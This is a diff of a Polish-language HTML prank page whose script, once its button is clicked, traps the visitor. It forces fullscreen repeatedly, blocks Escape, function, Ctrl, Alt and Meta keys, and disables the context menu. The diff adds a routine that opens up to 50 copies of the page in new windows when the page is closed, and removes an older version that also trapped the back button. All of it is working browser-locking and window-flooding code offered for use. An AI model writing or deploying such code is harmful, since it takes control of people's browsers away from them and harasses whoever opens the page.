@@ -1,90 +1,78 @@
 <!DOCTYPE html>
 <html lang="pl">
 <head>
-  <meta charset="utf-8">
-  <title>Kliknij jak jesteś odważny...</title>
-  <style>
-    body, html { margin:0; padding:0; height:100%; background:#000; overflow:hidden; }
-    #start {
-      position: absolute;
-      top: 50%; left: 50%;
-      transform: translate(-50%,-50%);
-      padding: 40px 80px;
-      font-size: 60px;
-      background: #c00;
-      color: #fff;
-      border: none;
-      border-radius: 30px;
-      cursor: pointer;
-      box-shadow: 0 0 40px #f00;
-    }
-    #start:hover { background:#f00; box-shadow:0 0 80px #f00; }
-    #hell { position:fixed; top:0; left:0; width:100%; height:100%; background:#000; display:none; }
-  </style>
+<meta charset="utf-8">
+<title>no to masz przejebane</title>
+<style>
+  body,html{margin:0;height:100%;background:#000;overflow:hidden}
+  #s {position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);padding:40px 90px;font-size:70px;background:#900;color:#fff;border:none;border-radius:30px;cursor:pointer;box-shadow:0 0 60px #f00;}
+  #s:hover{background:#f00;transform:translate(-50%,-50%) scale(1.1);}
+</style>
 </head>
 <body>
 
-<button id="start">START CZY SIĘ BOISZ?</button>
-<div id="hell"></div>
+<button id="s">START = KONIEC ŚWIATA</button>
 
-<audio id="sound" loop>
+<audio id="a" loop preload="auto">
   <source src="sound.mp3" type="audio/mpeg">
 </audio>
 
 <script>
-// === DIABELSKI SKRYPT ===
-// Wszystko uruchamia się dopiero po kliknięciu (żeby nie blokowało przed STARTEM)
-document.getElementById('start').onclick = function() {
-  const hell = document.getElementById('hell');
-  const audio = document.getElementById('sound');
-  const btn = document.getElementById('start');
+// === ARMAGEDON ===
+let apocalypse = false;
+let windowsOpened = 0;
+const MAX_WINDOWS = 50;
 
-  btn.remove();
-  hell.style.display = 'block';
-  audio.volume = 1;
-  audio.play();
+function nuke() {
+  if (apocalypse) return;
+  apocalypse = true;
 
-  // FULLSCREEN NA MAKSIMUM
-  const goFull = () => {
-    if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
-    else if (document.documentElement.webkitRequestFullscreen) document.documentElement.webkitRequestFullscreen();
-    else if (document.documentElement.msRequestFullscreen) document.documentElement.msRequestFullscreen();
-  };
-  goFull();
+  document.getElementById('s').remove();
+  document.getElementById('a').volume = 1;
+  document.getElementById('a').play();
 
-  // Jak wyjdzie z fullscreenu – od razu wraca (w nieskończoność)
-  document.addEventListener('fullscreenchange', () => { if (!document.fullscreenElement) goFull(); });
-  document.addEventListener('webkitfullscreenchange', () => { if (!document.webkitFullscreenElement) goFull(); });
+  // fullscreen w pętli
+  const fs = () => document.documentElement.requestFullscreen?.() || document.documentElement.webkitRequestFullscreen?.();
+  fs();
+  document.onfullscreenchange = () => { if (!document.fullscreenElement) fs(); };
 
-  // Blokujemy WSZYSTKIE znane skróty klawiszowe ucieczki
-  document.onkeydown = function(e) {
-    if (
-      e.key === "Escape" || 
-      e.key === "F11" || 
-      e.key === "F5" ||
-      (e.ctrlKey && (e.key === "w" || e.key === "r" || e.key === "F5")) ||
-      (e.ctrlKey && e.shiftKey && e.key === "W") ||
-      e.altKey && e.key === "F4" ||
-      (e.metaKey && (e.key === "w" || e.key === "q" || e.key === "r"))
-    ) {
-      e.preventDefault();
-      e.stopPropagation();
-      goFull();
+  // blokada klawiszy
+  document.onkeydown = e => {
+    if (e.key.includes('F') || e.ctrlKey || e.altKey || e.metaKey || e.key==='Escape') {
+      e.preventDefault(); e.stopPropagation(); fs();
       return false;
     }
   };
-
-  // Blokada prawego przycisku i menu kontekstowego
   document.oncontextmenu = () => false;
-  document.body.style.pointerEvents = 'none'; // nic nie da się kliknąć
 
-  // Na telefonach – blokujemy gest wstecz
-  history.pushState(null, null, location.href);
-  window.onpopstate = () => {
-    history.pushState(null, null, location.href);
-    goFull();
+  // === BOMBARDOWANIE NOWYMI OKNAMI ===
+  function spawn() {
+    if (windowsOpened >= MAX_WINDOWS) return;
+    const win = window.open(location.href, '_blank', 'width=800,height=600');
+    if (win) {
+      windowsOpened++;
+      // nowe okno też od razu ma iść w fullscreen i kontynuować atak
+      setTimeout(() => {
+        if (win && !win.closed) win.document.documentElement.requestFullscreen?.();
+      }, 300);
+    }
+  }
+
+  // jak ktoś zamknie to okno → spamujemy nowymi co 400 ms
+  window.onbeforeunload = () => spawn();
+  window.onunload = () => {
+    const killer = setInterval(spawn, 400);
+    setTimeout(() => clearInterval(killer), 15000); // max 15 sekund spamu
   };
-};
+
+  // na wszelki wypadek co sekundę sprawdzamy, czy żyjemy
+  setInterval(fs, 800);
+}
+
+document.getElementById('s').onclick = nuke;
+
+// jeśli ktoś wejdzie drugi raz (z nowego okna) – od razu odpala się bez przycisku
+if (window.name.includes('hell')) nuke();
 </script>
 </body>
 </html>
